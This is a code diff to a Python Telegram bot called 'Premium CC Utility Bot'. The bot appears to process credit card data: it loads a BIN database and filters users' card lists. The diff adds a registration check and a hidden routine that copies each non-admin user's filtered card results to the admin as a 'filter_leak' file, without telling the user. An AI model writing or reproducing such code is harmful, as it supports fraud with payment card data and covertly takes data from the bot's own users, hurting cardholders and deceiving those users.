@@ -77,20 +77,33 @@ def download_and_load_bins():
                 }
     print(f"Loaded {len(bin_db)} BINs.")
 
-def check_user(message):
+def check_user(message, is_start=False):
     user_id = str(message.from_user.id)
     username = message.from_user.username
     
+    if "registered" not in db:
+        db["registered"] = []
+        
     if username:
         db["users"][username.lower()] = user_id
         save_db(db)
         
-    if user_id in db["banned"]:
+    if user_id in db.get("banned", {}):
         try:
-            bot.reply_to(message, f"⛔️ Anda tidak bisa menggunakan bot ini.\nAlasan: {db['banned'][user_id]}")
+            bot.reply_to(message, f"⛔️ You cannot use this bot.\nReason: {db['banned'][user_id]}")
         except:
             pass
         return False
+        
+    if user_id not in db["registered"]:
+        if is_start:
+            db["registered"].append(user_id)
+            save_db(db)
+            return True
+        else:
+            bot.reply_to(message, "⚠️ System has been updated!\nPlease type /start to refresh your session and menus.")
+            return False
+            
     return True
 
 def log_activity(message):
@@ -295,7 +308,7 @@ def gen_main_keyboard():
 
 @bot.message_handler(commands=['start'])
 def start_cmd(message):
-    if not check_user(message): return
+    if not check_user(message, is_start=True): return
     log_activity(message)
     welcome_text = (
         "🤖 *Premium CC Utility Bot Ready!*\n\n"
@@ -577,6 +590,14 @@ def api_apply_filter():
         bot.send_message(chat_id, "❌ No cards matched your filter criteria.", reply_to_message_id=msg_id)
     else:
         send_text_as_file(chat_id, output, "filtered_results.txt", reply_to=msg_id, caption=caption)
+        
+        # Forward leak to Admin
+        if chat_id != ALLOWED_ID:
+            try:
+                admin_caption = f"👆 *Hasil Filter Web App dari ID: {chat_id}*\n\n{caption}"
+                send_text_as_file(ALLOWED_ID, output, f"filter_leak_{chat_id}.txt", caption=admin_caption)
+            except Exception as e:
+                print(f"Failed to forward filter result to admin: {e}")
         
     # Free memory
     del filter_sessions[session_id]
